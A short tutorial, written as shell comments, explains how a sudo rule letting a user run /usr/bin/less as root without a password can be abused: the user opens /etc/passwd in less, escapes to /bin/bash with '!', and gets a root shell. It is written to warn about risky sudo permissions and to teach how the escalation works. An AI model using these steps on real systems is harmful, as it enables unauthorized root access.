# root access without using entire permission of sudo. 
# It tells that giving commands permission can be risky without knowing the entire meaning of that

# first check sudo access. which commands, user can access and as whom.

sudo -l
john ALL=(root) NOPASSWD: /usr/bin/less

# here user can access only less commands as an root user. it looks 100% right. but believe me it's not. i explain you how and why

# run less commands as root 
sudo less /etc/passwd

# you will see
# - /etc/passwd contents looks harmless
# - you are inside less and less is running as root

###  Escape from less

# While still inside less, press:
!
# now type:
/bin/bash
# Press Enter. 
# Run:
whoami

# most probably you become root user. 

# What happend internally.
1. sudo allowed /usr/bin/less
2. sudo switched UID → root
3. sudo stepped aside
4. less allowed shell execution
5. shell inherited root privileges